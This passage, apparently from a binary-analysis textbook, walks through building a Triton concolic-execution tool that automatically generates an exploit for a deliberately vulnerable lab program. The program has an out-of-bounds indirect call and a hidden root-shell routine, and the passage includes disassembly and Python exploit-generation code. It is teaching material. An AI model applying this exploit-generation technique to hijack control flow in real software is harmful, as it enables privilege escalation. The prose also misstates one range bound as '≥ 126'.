<p class="indent">The <span class="literal">icall</span> program revolves around a global <span class="literal">struct</span>, which is also called <span class="literal">icall</span> <span class="ent">➊</span>. This <span class="literal">struct</span> contains an array called <span class="literal">icall.functions</span> that has room for two function pointers and a <span class="literal">char</span> array called <span class="literal">icall.hash</span> that stores a 4-byte hash with a terminating <span class="literal">NULL</span> character. The <span class="literal">main</span> function initializes the first entry in <span class="literal">icall.functions</span> so that it points to a function called <span class="literal">forward</span>, and initializes the second entry so that it points to <span class="literal">reverse</span> <span class="ent">➋</span>. Both these functions take a hash parameter in the form of a <span class="literal">char*</span> and print the hash’s bytes in forward or reverse order, respectively.</p>&#13;
<p class="indent">The <span class="literal">icall</span> program takes two command line arguments: an integer index and a string. The index decides which entry from <span class="literal">icall.functions</span> will be called, while the string serves as input to generate the hash, as you’ll see in a moment.</p>&#13;
<p class="indent">There’s also a secret third command line argument not advertised in the usage string. This argument is a password for an admin area that provides a root shell. To check the password, <span class="literal">icall</span> hashes it with the GNU <span class="literal">crypt</span> function (from <em>crypt.h</em>), and if the hash is correct, the user is granted access to the root shell <span class="ent">➌</span>. Our goal for the exploit is to hijack an indirect call site and redirect it to this secret admin area without knowing the password.</p>&#13;
<p class="indent">If no secret password is supplied <span class="ent">➍</span>, <span class="literal">icall</span> calls a function named <span class="literal">hash</span> that computes a 4-byte hash over the string supplied by the user and places that hash in <span class="literal">icall.hash</span> <span class="ent">➎</span>. After computing the hash, <span class="literal">icall</span> parses the index from the command line <span class="ent">➏</span> and uses it to index the <span class="literal">icall.functions</span> array, indirectly calling the handler at that index and passing the just-computed hash as the argument <span class="ent">➐</span>. This indirect call is the one I’ll use in the exploit. For diagnostics, <span class="literal">icall</span> prints the address of the function it’s about to invoke, which will be handy later when crafting the exploit.</p>&#13;
<p class="indent">Normally, the indirect call invokes <span class="literal">forward</span> or <span class="literal">reverse</span>, which then prints the hash to screen as follows:</p>&#13;
<p class="programs"><span class="ent">➊</span> <span class="codestrong1">$ ./icall 1 foo</span><br/><span class="ent">➋</span> Calling 0x400974<br/><span class="ent">➌</span> reverse: 22295079</p>&#13;
<p class="indent">Here, I’ve used <span class="literal">1</span> as the function index, resulting in a call to the <span class="literal">reverse</span> function, and <span class="literal">foo</span> as the input string <span class="ent">➊</span>. You can see that the indirect call targets address <span class="literal">0x400974</span> (the start of <span class="literal">reverse</span>) <span class="ent">➋</span>, and the hash of <span class="literal">foo</span>, printed in reverse, is <span class="literal">0x22295079</span> <span class="ent">➌</span>.</p>&#13;
<p class="indent">You may have noticed that the indirect call is vulnerable: there’s no verification that the user-supplied index stays within the bounds of <span class="literal">icall.functions</span>, so by supplying an out-of-bounds index, the user can coax the <span class="literal">icall</span> program into using data <em>outside</em> the <span class="literal">icall.functions</span> array as <span epub:type="pagebreak" id="page_359"/>the indirect call target! As it happens, the <span class="literal">icall.hash</span> field is adjacent to <span class="literal">icall.functions</span> in memory, so by supplying the out-of-bounds index 2, the user can trick the <span class="literal">icall</span> program into using <span class="literal">icall.hash</span> as the indirect call target, as you can see in the following listing:</p>&#13;
<p class="programs"><span class="codestrong1">   $ ./icall 2 foo</span><br/><span class="ent">➊</span> Calling 0x22295079<br/><span class="ent">➋</span> Segmentation fault (core dumped)</p>&#13;
<p class="indent">Note that the called address corresponds to the hash interpreted as a little-endian address <span class="ent">➊</span>! There’s no code at that address, so the program crashes with a segmentation fault <span class="ent">➋</span>. However, recall that the user controls not only the index but also the string used as the input for the hash. The challenge is to find a string that hashes exactly to the address of the secret admin area and then trick the indirect call into using that hash as the call target, thereby transferring control to the admin area and giving you a root shell without needing to know the password.</p>&#13;
<p class="indent">To manually craft an exploit for this vulnerability, you would need to either use brute force or reverse engineer the <span class="literal">hash</span> function to figure out which input string provides the desired hash. The great thing about using symbex to generate the exploit is that it will automatically solve the <span class="literal">hash</span> function, allowing you to simply treat it as a black box!</p>&#13;
<h4 class="h4" id="ch13_5_2"><em>13.5.2 Finding the Address of the Vulnerable Call Site</em></h4>&#13;
<p class="noindent">Automatically building the exploit requires two key pieces of information: the address of the vulnerable indirect call site that the exploit should hijack and the address of the secret admin area where you want to redirect control. <a href="ch13.xhtml#ch13list13">Listing 13-13</a> shows the disassembly of the <span class="literal">main</span> function from the <span class="literal">icall</span> binary, which contains both these addresses.</p>&#13;
<p class="listing1" id="ch13list13"><em>Listing 13-13: Disassembly excerpt from</em> ~/code/chapter13/icall</p>&#13;
<p class="programs">   0000000000400abe &lt;main&gt;:<br/>     400abe:  55                    push   rbp<br/>     400abf:  48 89 e5              mov    rbp,rsp<br/>     400ac2:  48 83 ec 20           sub    rsp,0x20<br/>     400ac6:  89 7d ec              mov    DWORD PTR [rbp-0x14],edi<br/>     400ac9:  48 89 75 e0           mov    QWORD PTR [rbp-0x20],rsi<br/>     400acd:  48 c7 05 c8 15 20 00  mov    QWORD PTR [rip+0x2015c8],0x400916<br/>     400ad4:  16 09 40 00<br/>     400ad8:  48 c7 05 c5 15 20 00  mov    QWORD PTR [rip+0x2015c5],0x400974<br/>     400adf:  74 09 40 00<br/>     400ae3:  83 7d ec 02           cmp    DWORD PTR [rbp-0x14],0x2<br/>     400ae7:  7f 23                 jg     400b0c &lt;main+0x4e&gt;<br/>     400ae9:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]<br/>     400aed:  48 8b 00              mov    rax,QWORD PTR [rax]<br/>     400af0:  48 89 c6              mov    rsi,rax<br/><span epub:type="pagebreak" id="page_360"/>     400af3:  bf a1 0c 40 00        mov    edi,0x400ca1<br/>     400af8:  b8 00 00 00 00        mov    eax,0x0<br/>     400afd:  e8 5e fc ff ff        call   400760 &lt;printf@plt&gt;<br/>     400b02:  b8 01 00 00 00        mov    eax,0x1<br/>     400b07:  e9 ea 00 00 00        jmp    400bf6 &lt;main+0x138&gt;<br/>     400b0c:  83 7d ec 03           cmp    DWORD PTR [rbp-0x14],0x3<br/>     400b10:  7e 78                 jle    400b8a &lt;main+0xcc&gt;<br/>     400b12:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]<br/>     400b16:  48 83 c0 18           add    rax,0x18<br/>     400b1a:  48 8b 00              mov    rax,QWORD PTR [rax]<br/>     400b1d:  be bd 0c 40 00        mov    esi,0x400cbd<br/>     400b22:  48 89 c7              mov    rdi,rax<br/>     400b25:  e8 56 fc ff ff        call   400780 &lt;crypt@plt&gt;<br/>     400b2a:  be c8 0c 40 00        mov    esi,0x400cc8<br/>     400b2f:  48 89 c7              mov    rdi,rax<br/>     400b32:  e8 69 fc ff ff        call   4007a0 &lt;strcmp@plt&gt;<br/>     400b37:  85 c0                 test   eax,eax<br/>     400b39:  75 4f                 jne    400b8a &lt;main+0xcc&gt;<br/><span class="ent">➊</span>   400b3b:  e8 70 fc ff ff        call   4007b0 &lt;getegid@plt&gt;<br/>     400b40:  89 c7                 mov    edi,eax<br/><span class="ent">➋</span>   400b42:  e8 79 fc ff ff        call   4007c0 &lt;setgid@plt&gt;<br/>     400b47:  85 c0                 test   eax,eax<br/>     400b49:  74 0a                 je     400b55 &lt;main+0x97&gt;<br/>     400b4b:  bf e9 0c 40 00        mov    edi,0x400ce9<br/>     400b50:  e8 7b fc ff ff        call   4007d0 &lt;perror@plt&gt;<br/>     400b55:  e8 16 fc ff ff        call   400770 &lt;geteuid@plt&gt;<br/>     400b5a:  89 c7                 mov    edi,eax<br/><span class="ent">➌</span>   400b5c:  e8 8f fc ff ff        call   4007f0 &lt;setuid@plt&gt;<br/>     400b61:  85 c0                 test   eax,eax<br/>     400b63:  74 0a                 je     400b6f &lt;main+0xb1&gt;<br/>     400b65:  bf f0 0c 40 00        mov    edi,0x400cf0<br/>     400b6a:  e8 61 fc ff ff        call   4007d0 &lt;perror@plt&gt;<br/>     400b6f:  ba 00 00 00 00        mov    edx,0x0<br/>     400b74:  be f7 0c 40 00        mov    esi,0x400cf7<br/>     400b79:  bf f7 0c 40 00        mov    edi,0x400cf7<br/>     400b7e:  b8 00 00 00 00        mov    eax,0x0<br/><span class="ent">➍</span>   400b83:  e8 78 fc ff ff        call   400800 &lt;execl@plt&gt;<br/>     400b88:  eb 67                 jmp    400bf1 &lt;main+0x133&gt;<br/>     400b8a:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]<br/>     400b8e:  48 83 c0 10           add    rax,0x10<br/>     400b92:  48 8b 00              mov    rax,QWORD PTR [rax]<br/>     400b95:  be b0 20 60 00        mov    esi,0x6020b0<br/>     400b9a:  48 89 c7              mov    rdi,rax<br/>     400b9d:  e8 30 fe ff ff        call   4009d2 &lt;hash&gt;<br/>     400ba2:  48 8b 45 e0           mov    rax,QWORD PTR [rbp-0x20]<br/>     400ba6:  48 83 c0 08           add    rax,0x8<br/>     400baa:  48 8b 00              mov    rax,QWORD PTR [rax]<br/><span epub:type="pagebreak" id="page_361"/>     400bad:  ba 00 00 00 00        mov    edx,0x0<br/>     400bb2:  be 00 00 00 00        mov    esi,0x0<br/>     400bb7:  48 89 c7              mov    rdi,rax<br/>     400bba:  e8 21 fc ff ff        call   4007e0 &lt;strtoul@plt&gt;<br/>     400bbf:  89 45 fc              mov    DWORD PTR [rbp-0x4],eax<br/>     400bc2:  8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]<br/>     400bc5:  48 8b 04 c5 a0 20 60  mov    rax,QWORD PTR [rax*8+0x6020a0]<br/>     400bcc:  00      <br/>     400bcd:  48 89 c6              mov    rsi,rax<br/>     400bd0:  bf ff 0c 40 00        mov    edi,0x400cff<br/>     400bd5:  b8 00 00 00 00        mov    eax,0x0<br/>     400bda:  e8 81 fb ff ff        call   400760 &lt;printf@plt&gt;<br/>     400bdf:  8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]<br/>     400be2:  48 8b 04 c5 a0 20 60  mov    rax,QWORD PTR [rax*8+0x6020a0]<br/>     400be9:  00<br/>     400bea:  bf b0 20 60 00        mov    edi,0x6020b0<br/><span class="ent">➎</span>   400bef: ff d0                  call   rax<br/>     400bf1:  b8 00 00 00 00        mov    eax,0x0<br/>     400bf6:  c9                    leave<br/>     400bf7:  c3                    ret<br/>     400bf8:  0f 1f 84 00 00 00 00  nop    DWORD PTR [rax+rax*1+0x0]<br/>     400bff:  00</p>&#13;
<p class="indent">The code for the secret admin area starts at address <span class="literal">0x400b3b</span> <span class="ent">➊</span>, so that’s where you’ll want to redirect control. You can tell it’s the admin area by the calls to <span class="literal">setgid</span> <span class="ent">➋</span> and <span class="literal">setuid</span> <span class="ent">➌</span>, where <span class="literal">icall</span> prepares the <span class="literal">root</span> privileges for the shell, and by the call to <span class="literal">execl</span> <span class="ent">➍</span> that spawns the shell itself. The vulnerable indirect call site to hijack is at address <span class="literal">0x400bef</span> <span class="ent">➎</span>.</p>&#13;
<p class="indent">Now that you have the necessary addresses, let’s build the symbex tool to generate the exploit.</p>&#13;
<h4 class="h4" id="ch13_5_3"><em>13.5.3 Building the Exploit Generator</em></h4>&#13;
<p class="noindent">Briefly put, the tool that generates the exploit works by concolically executing the <span class="literal">icall</span> program, symbolizing all of the command line arguments given by the user, with a separate symbolic variable per byte of input. It then tracks this symbolic state all the way from the start of the program and through the <span class="literal">hash</span> function until execution finally reaches the indirect call site to exploit. At that point, the exploit generator calls the constraint solver and asks it if there’s any assignment of concrete values to the symbolic variables that makes the indirect call target (stored in <span class="literal">rax</span>) equal to the address of the secret admin area. If such a model exists, the exploit generator prints it to screen, and you can then use those values as input to exploit the <span class="literal">icall</span> program.</p>&#13;
<p class="indent">Note that in contrast to the earlier examples, this one uses Triton’s concolic mode rather than its symbolic emulation mode. The reason is that generating the exploit requires tracing the symbolic state through a whole program across multiple functions, which is inconvenient and slow in emulation <span epub:type="pagebreak" id="page_362"/>mode. Moreover, concolic execution mode makes it easy to experiment with different lengths for the input string.</p>&#13;
<p class="indent">Unlike most examples in this book, this one is written in Python because Triton’s concolic mode only allows you to use the Python API. Concolic Triton tools are Python scripts that you pass to a special Pin tool that provides Triton’s concolic engine. Triton provides a wrapper script called <span class="literal">triton</span> that automatically takes care of all the details of calling Pin so that all you have to do is specify which Triton tool to use and which program to analyze. You can find the <span class="literal">triton</span> wrapper script in <em>~/triton/pin-2.14-71313-gcc.4.4.7-linux/ source/tools/Triton/build</em>, and you’ll see an example of how to use it when testing the automatic exploit generation tool.</p>&#13;
<h5 class="h5">Setting Up the Concolic Execution</h5>&#13;
<p class="noindent"><a href="ch13.xhtml#ch13list14">Listing 13-14</a> shows the first part of the exploit generation tool, <em>exploit _callsite.py</em>.</p>&#13;
<p class="listing1" id="ch13list14"><em>Listing 13-14:</em> exploit_callsite.py</p>&#13;
<p class="programs">   #!/usr/bin/env python2<br/>   ## -*- coding: utf-8 -*-<br/><br/><span class="ent">➊</span> import triton<br/>   import pintool<br/><br/><span class="ent">➋</span> taintedCallsite = 0x400bef # Found in a previous DTA pass<br/>   target          = 0x400b3b # Target to redirect callsite to<br/><br/><span class="ent">➌</span> Triton = pintool.getTritonContext()<br/><br/>   def main():<br/><span class="ent">➍</span>     Triton.setArchitecture(triton.ARCH.X86_64)<br/>       Triton.enableMode(triton.MODE.ALIGNED_MEMORY, True)<br/><br/><span class="ent">➎</span>     pintool.startAnalysisFromSymbol('main')<br/><br/><span class="ent">➏</span>     pintool.insertCall(symbolize_inputs, pintool.INSERT_POINT.ROUTINE_ENTRY, 'main')<br/><span class="ent">➐</span>     pintool.insertCall(hook_icall, pintool.INSERT_POINT.BEFORE)<br/><br/><span class="ent">➑</span>     pintool.runProgram()<br/><br/>   if __name__ == '__main__':<br/>       main()</p>&#13;
<p class="indent">Concolic Triton tools like <em>exploit_callsite.py</em> must import the <span class="literal">triton</span> and <span class="literal">pintool</span> modules <span class="ent">➊</span>, which provide access to the familiar Triton API and Triton’s bindings for interacting with Pin, respectively. Unfortunately, <span epub:type="pagebreak" id="page_363"/>there’s no way to pass command line arguments to concolic Triton tools, so I’ve instead hardcoded the addresses of the indirect call site you’re exploiting (<span class="literal">taintedCallsite</span>) and the secret admin area (<span class="literal">target</span>) <span class="ent">➋</span> to which you want to redirect control. The <span class="literal">taintedCallsite</span> variable gets its name from the assumption that you found this call site in a previous taint analysis pass. As an alternative to hardcoded arguments, you could also pass arguments via environment variables, for example.</p>&#13;
<p class="indent">Concolic Triton tools maintain the symbex state in a global Triton context, which you access by calling <span class="literal">pintool.getTritonContext()</span> <span class="ent">➌</span>. This returns a <span class="literal">TritonContext</span> object that you can use to access (a subset of) the familiar Triton API functions. Here, <em>exploit_callsite.py</em> stores a reference to that <span class="literal">TritonContext</span> in a global variable called <span class="literal">Triton</span> for easy access.</p>&#13;
<p class="indent">The main logic of <em>exploit_callsite.py</em> starts in the function named <span class="literal">main</span>, which is called when the script starts. Just like in the C++ symbolic emulation tools you saw earlier, it starts by setting the Triton architecture and enabling the <span class="literal">ALIGNED_MEMORY</span> optimization <span class="ent">➍</span>. Because this tool is tailored toward the <span class="literal">icall</span> binary you’re exploiting, I’ve simply hardcoded the architecture to x86-64 instead of making it configurable.</p>&#13;
<p class="indent">Next, <em>exploit_callsite.py</em> uses Triton’s <span class="literal">pintool</span> API to set up the starting point for the concolic analysis. It tells Triton to start the symbolic analysis from the <span class="literal">main</span> function in the vulnerable <span class="literal">icall</span> program <span class="ent">➎</span>. That means all of <span class="literal">icall</span>’s initialization code that comes before <span class="literal">main</span> runs without symbolic analysis, and Triton’s analysis kicks in once execution reaches <span class="literal">main</span>.</p>&#13;
<p class="indent">Note that this assumes that symbols are available; if they aren’t, then Triton won’t know where the <span class="literal">main</span> function is. In that case, you’ll instead have to find the address of <span class="literal">main</span> yourself through disassembly and tell Triton to start analysis at that address by calling <span class="literal">pintool.startAnalysisFromAddress</span> instead of <span class="literal">pintool.startAnalysisFromSymbol</span>.</p>&#13;
<p class="indent">After configuring the analysis starting point, <em>exploit_callsite.py</em> registers two callbacks using Triton’s <span class="literal">pintool.insertCall</span> function. The <span class="literal">pintool.insertCall</span> function takes at least two arguments: a callback function and an <em>insert point</em>, followed by zero or more optional arguments depending on the type of insert point.</p>&#13;
<p class="indent">The first installed callback function is named <span class="literal">symbolize_inputs</span> and uses the insert point <span class="literal">INSERT_POINT.ROUTINE_ENTRY</span> <span class="ent">➏</span>, which means the callback triggers when execution reaches the entry point of a given routine. You can specify that routine by name in an extra argument to <span class="literal">insertCall</span>. In the case of <span class="literal">symbolize_inputs</span>, I’ve specified <span class="literal">main</span> as the routine to install the callback on because the purpose of <span class="literal">symbolize_inputs</span> is to symbolize all of the user inputs given to <span class="literal">icall</span>’s <span class="literal">main</span> function. When a callback of type <span class="literal">ROUTINE_ENTRY</span> happens, Triton passes the current thread ID as an argument to the callback function.</p>&#13;
<p class="indent">The second callback is named <span class="literal">hook_icall</span>, and it’s installed on the insert point <span class="literal">INSERT_POINT.BEFORE</span> <span class="ent">➐</span>, meaning that the callback triggers before every instruction. The job of <span class="literal">hook_icall</span> is to check whether execution has reached the vulnerable indirect call site and, if so, generate an exploit for it given <span epub:type="pagebreak" id="page_364"/>the results of the symbolic analysis. When the callback triggers, Triton provides <span class="literal">hook_icall</span> with an <span class="literal">Instruction</span> argument representing the details of the instruction that’s about to execute so that <span class="literal">hook_icall</span> can check whether it’s the indirect call instruction you want to exploit. <a href="ch13.xhtml#ch13tab1">Table 13-1</a> shows an overview of all the possible insert points Triton supports.</p>&#13;
<p class="tab-caption" id="ch13tab1"><strong>Table 13-1:</strong> Triton Insert Points for Callbacks in Concolic Mode</p>&#13;
<table class="topbot-d">&#13;
<thead>&#13;
<tr>&#13;
<td style="border-top: solid 0.3em; border-bottom: solid 0.2em;"><strong>Insert point</strong></td>&#13;
<td style="border-top: solid 0.3em; border-bottom: solid 0.2em;"><strong>Callback moment</strong></td>&#13;
<td style="border-top: solid 0.3em; border-bottom: solid 0.2em;"><strong>Arguments</strong></td>&#13;
<td style="border-top: solid 0.3em; border-bottom: solid 0.2em;"><strong>Callback arguments</strong></td>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td><span class="literal">AFTER</span></td>&#13;
<td>After instruction executes</td>&#13;
<td/>&#13;
<td><span class="literal">Instruction</span> object</td>&#13;
</tr>&#13;
<tr>&#13;
<td><span class="literal">BEFORE</span></td>&#13;
<td>Before instruction executes</td>&#13;
<td/>&#13;
<td><span class="literal">Instruction</span> object</td>&#13;
</tr>&#13;
<tr>&#13;
<td><span class="literal">BEFORE_SYMPROC</span></td>&#13;
<td>Before symbolic processing</td>&#13;
<td/>&#13;
<td><span class="literal">Instruction</span> object</td>&#13;
</tr>&#13;
<tr>&#13;
<td><span class="literal">FINI</span></td>&#13;
<td>End of execution</td>&#13;
<td/>&#13;
<td/>&#13;
</tr>&#13;
<tr>&#13;
<td><span class="literal">ROUTINE_ENTRY</span></td>&#13;
<td>Routine entry point</td>&#13;
<td>Routine name</td>&#13;
<td>Thread ID</td>&#13;
</tr>&#13;
<tr>&#13;
<td><span class="literal">ROUTINE_EXIT</span></td>&#13;
<td>Routine exit</td>&#13;
<td>Routine name</td>&#13;
<td>Thread ID</td>&#13;
</tr>&#13;
<tr>&#13;
<td><span class="literal">IMAGE_LOAD</span></td>&#13;
<td>New image loaded</td>&#13;
<td/>&#13;
<td>Image path, base address, size</td>&#13;
</tr>&#13;
<tr>&#13;
<td><span class="literal">SIGNALS</span></td>&#13;
<td>Signal delivery</td>&#13;
<td/>&#13;
<td>Thread ID, signal ID</td>&#13;
</tr>&#13;
<tr>&#13;
<td><span class="literal">SYSCALL_ENTRY</span></td>&#13;
<td>Before syscall</td>&#13;
<td/>&#13;
<td>Thread ID, syscall descriptor</td>&#13;
</tr>&#13;
<tr>&#13;
<td style="border-bottom: solid 0.2em;"><span class="literal">SYSCALL_EXIT</span></td>&#13;
<td style="border-bottom: solid 0.2em;">After syscall</td>&#13;
<td style="border-bottom: solid 0.2em;"/>&#13;
<td style="border-bottom: solid 0.2em;">Thread ID, syscall descriptor</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">Finally, after completing the prerequisite setup, <em>exploit_callsite.py</em> calls <span class="literal">pintool.runProgram</span> to start running the analyzed program <span class="ent">➑</span>. That completes all the necessary setup for concolically analyzing the <span class="literal">icall</span> program, but I haven’t yet discussed any of the code responsible for generating the actual exploit. Let’s do that now and discuss the callback handler functions <span class="literal">symbolize_inputs</span> and <span class="literal">hook_icall</span>, which implement the user input symbolization and the call site exploitation, respectively.</p>&#13;
<h5 class="h5">Symbolizing the User Inputs</h5>&#13;
<p class="noindent"><a href="ch13.xhtml#ch13list15">Listing 13-15</a> shows the implementation of <span class="literal">symbolize_inputs</span>, the handler that’s called when execution reaches the <span class="literal">main</span> function of the analyzed program. In accordance with <a href="ch13.xhtml#ch13tab1">Table 13-1</a>, <span class="literal">symbolize_inputs</span> takes a thread ID parameter because it’s a callback for the <span class="literal">ROUTINE_ENTRY</span> insert point. For the purposes of this example, you don’t need to know the thread ID and can simply ignore it. As mentioned previously, <span class="literal">symbolize_inputs</span> symbolizes all the command line arguments given by the user so that the solver can later figure out how to manipulate these symbolic variables to craft an exploit.</p>&#13;
<p class="listing1" id="ch13list15"><em>Listing 13-15:</em> exploit_callsite.py <em>(continued)</em></p>&#13;
<p class="programs">   def symbolize_inputs(tid):<br/><span class="ent">➊</span>     rdi = pintool.getCurrentRegisterValue(Triton.registers.rdi) # argc<br/>       rsi = pintool.getCurrentRegisterValue(Triton.registers.rsi) # argv<br/><br/>       # for each string in argv<br/><span class="ent">➋</span>     while rdi &gt; 1:<br/><span class="ent">➌</span>         addr = pintool.getCurrentMemoryValue(<br/>           rsi + ((rdi-1)*triton.CPUSIZE.QWORD),<br/><span epub:type="pagebreak" id="page_365"/><br/>           triton.CPUSIZE.QWORD)<br/>       # symbolize current argument string (including terminating NULL)<br/>       c = None<br/>       s = ''<br/><span class="ent">➍</span>     while c != 0:<br/><span class="ent">➎</span>         c = pintool.getCurrentMemoryValue(addr)<br/>           s += chr(c)<br/><span class="ent">➏</span>         Triton.setConcreteMemoryValue(addr, c)<br/><span class="ent">➐</span>         Triton.convertMemoryToSymbolicVariable(<br/>                   triton.MemoryAccess(addr, triton.CPUSIZE.BYTE)<br/>               ).setComment('argv[%d][%d]' % (rdi-1, len(s)-1))<br/>           addr += 1<br/>       rdi -= 1<br/>       print 'Symbolized argument %d: %s' % (rdi, s)</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_366"/>To symbolize the user inputs, <span class="literal">symbolize_inputs</span> needs access to the argument count (<span class="literal">argc</span>) and argument vector (<span class="literal">argv</span>) of the analyzed program. Because <span class="literal">symbolize_inputs</span> is called when <span class="literal">main</span> starts, you can get <span class="literal">argc</span> and <span class="literal">argv</span> by reading the <span class="literal">rdi</span> and <span class="literal">rsi</span> registers, which contain <span class="literal">main</span>’s first two arguments according to the x86-64 System V ABI <span class="ent">➊</span>. To read a register’s current value as it is in the concrete execution, you use the <span class="literal">pintool.getCurrentRegisterValue</span> function, giving the register’s ID as input.</p>&#13;
<p class="indent">After obtaining <span class="literal">argc</span> and <span class="literal">argv</span>, <span class="literal">symbolize_inputs</span> loops over all the arguments by decrementing <span class="literal">rdi</span> (<span class="literal">argc</span>) until no more arguments remain <span class="ent">➋</span>. Recall that in C/C++ programs, <span class="literal">argv</span> is an array of pointers to character strings. To get a pointer from <span class="literal">argv</span>, <span class="literal">symbolize_inputs</span> reads 8 bytes (<span class="literal">triton.CPUSIZE.QWORD</span>) from the <span class="literal">argv</span> entry currently indexed by <span class="literal">rdi</span> using Triton’s <span class="literal">pintool.getCurrentMemoryValue</span> function, which takes an address and size as input <span class="ent">➌</span>, and stores the read pointer in <span class="literal">addr</span>.</p>&#13;
<p class="indent">Next, <span class="literal">symbolize_inputs</span> reads all of the characters from the string pointed to by <span class="literal">addr</span> in turn, incrementing <span class="literal">addr</span> until it reads a <span class="literal">NULL</span> character <span class="ent">➍</span>. To read each character, it again uses <span class="literal">getCurrentMemoryValue</span> <span class="ent">➎</span>, this time without a size argument so that it reads the default size of 1 byte. After reading a character, <span class="literal">symbolize_inputs</span> sets that character as the concrete value for that memory address in Triton’s global context <span class="ent">➏</span> and converts the memory address containing the user input byte into a symbolic variable <span class="ent">➐</span>, setting a comment on that symbolic variable to later remind you to which <span class="literal">argv</span> index it corresponds. Again, this should be familiar from the C++ examples you saw before.</p>&#13;
<p class="indent">After <span class="literal">symbolize_inputs</span> completes, all of the command line arguments given by the user will have been converted into separate symbolic variables (one per input byte) and set as concrete state in Triton’s global context. Now let’s see how <em>exploit_callsite.py</em> uses the solver to solve for these symbolic variables and find an exploit for the vulnerable call site.</p>&#13;
<h5 class="h5"><span epub:type="pagebreak" id="page_367"/>Solving for an Exploit</h5>&#13;
<p class="noindent"><a href="ch13.xhtml#ch13list16">Listing 13-16</a> shows <span class="literal">hook_icall</span>, the callback that’s called just before every instruction.</p>&#13;
<p class="listing1" id="ch13list16"><em>Listing 13-16:</em> exploit_callsite.py <em>(continued)</em></p>&#13;
<p class="programs">   def hook_icall(insn):<br/><span class="ent">➊</span>     if insn.isControlFlow() and insn.getAddress() == taintedCallsite:<br/><span class="ent">➋</span>         for op in insn.getOperands():<br/><span class="ent">➌</span>             if op.getType() == triton.OPERAND.REG:<br/>                  print 'Found tainted indirect call site \'%s\'' % (insn)<br/><span class="ent">➍</span>                exploit_icall(insn, op)</p>&#13;
<p class="indent">For each instruction, <span class="literal">hook_icall</span> checks whether it’s the indirect call that you want to exploit. It first verifies that this is a control flow instruction <span class="ent">➊</span> and that it has the address of the call site you want to exploit. It then loops over all the instruction’s operands <span class="ent">➋</span> to find the register operand containing the call site’s target address <span class="ent">➌</span>. Finally, if all these checks hold up, <span class="literal">hook_icall</span> calls the <span class="literal">exploit_icall</span> function to compute the exploit itself <span class="ent">➍</span>. <a href="ch13.xhtml#ch13list17">Listing 13-17</a> shows the implementation of <span class="literal">exploit_icall</span>.</p>&#13;
<p class="listing1" id="ch13list17"><em>Listing 13-17:</em> exploit_callsite.py <em>(continued)</em></p>&#13;
<p class="programs">   def exploit_icall(insn, op):<br/><span class="ent">➊</span>      regId   = Triton.getSymbolicRegisterId(op)<br/><span class="ent">➋</span>      regExpr = Triton.unrollAst(Triton.getAstFromId(regId))<br/><span class="ent">➌</span>      ast = Triton.getAstContext()<br/><br/><span class="ent">➍</span>      exploitExpr = ast.equal(regExpr, ast.bv(target, triton.CPUSIZE.QWORD_BIT))<br/><span class="ent">➎</span>      for k, v in Triton.getSymbolicVariables().iteritems():<br/><span class="ent">➏</span>          if 'argv' in v.getComment():<br/>               # Argument characters must be printable<br/><span class="ent">➐</span>             argExpr = Triton.getAstFromId(k)<br/><span class="ent">➑</span>             argExpr = ast.land([<br/>                             ast.bvuge(argExpr, ast.bv(32, triton.CPUSIZE.BYTE_BIT)),<br/>                             ast.bvule(argExpr, ast.bv(126, triton.CPUSIZE.BYTE_BIT))<br/>                        ])<br/><span class="ent">➒</span>             exploitExpr = ast.land([exploitExpr, argExpr])<br/><br/>       print 'Getting model for %s -&gt; 0x%x' % (insn, target)<br/><span class="ent">➓</span>     model = Triton.getModel(exploitExpr)<br/>      for k, v in model.iteritems():<br/>          print '%s (%s)' % (v, Triton.getSymbolicVariableFromId(k).getComment())</p>&#13;
<p class="indent">To compute the exploit for the vulnerable call site, <span class="literal">exploit_icall</span> starts by getting the register ID of the register operand containing the indirect call’s target address <span class="ent">➊</span>. It then calls <span class="literal">Triton.getAstFromId</span> to get the AST containing the symbolic expression for this register and calls <span class="literal">Triton.unrollAst</span> to “unroll” it into a fully expanded AST without reference nodes <span class="ent">➋</span>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_368"/>Next, <span class="literal">exploit_icall</span> gets a Triton <span class="literal">AstContext</span>, which it uses to build the AST expression for the solver <span class="ent">➌</span>, just like you saw before in the code coverage tool in <a href="ch13.xhtml#ch13_4">Section 13.4</a>. The base constraint to satisfy for the exploit is straightforward: you want to find a solution such that the symbolic expression for the indirect call’s target register equals the address of the secret admin area as stored in the global <span class="literal">target</span> variable <span class="ent">➍</span>.</p>&#13;
<p class="indent">Note that the constant <span class="literal">triton.CPUSIZE.QWORD_BIT</span> represents the size of a machine quad word (8 bytes) <em>in bits</em> in contrast to <span class="literal">triton.CPUSIZE.QWORD</span>, which represents that same size in bytes. This means that <span class="literal">ast.bv(target, triton.CPUSIZE.QWORD_BIT)</span> builds a 64-bit bitvector containing the address of the secret admin area.</p>&#13;
<p class="indent">In addition to the base constraint for the target register expression, the exploit requires some constraints on the form the user inputs can take. To impose these constraints, <span class="literal">exploit_icall</span> loops over all the symbolic variables <span class="ent">➎</span>, checking their comments to see whether they represent user input bytes from <span class="literal">argv</span> <span class="ent">➏</span>. If so, <span class="literal">exploit_icall</span> gets the symbolic variable’s AST expression <span class="ent">➐</span> and constrains it such that the byte must be a printable ASCII character <span class="ent">➑</span> ( ≥ 32 and ≥ 126). It then appends this constraint to the overall list of constraints for the exploit <span class="ent">➒</span>.</p>&#13;
<p class="indent">Finally, <span class="literal">exploit_icall</span> calls <span class="literal">Triton.getModel</span> to compute an exploit model for the set of constraints it just built <span class="ent">➓</span>, and if such a model exists, it prints the model to screen so that the user can use it to exploit the <span class="literal">icall</span> program. For each variable in the model, the output shows its Triton ID as well as its human-readable comment that says to which <span class="literal">argv</span> byte the symbolic variable corresponds. That way, the user can easily map the model back onto concrete command line arguments. Let’s try this by generating an exploit for the <span class="literal">icall</span> program and using it to gain a root shell.</p>&#13;
<h4 class="h4" id="ch13_5_4"><em>13.5.4 Getting a Root Shell</em></h4>&#13;
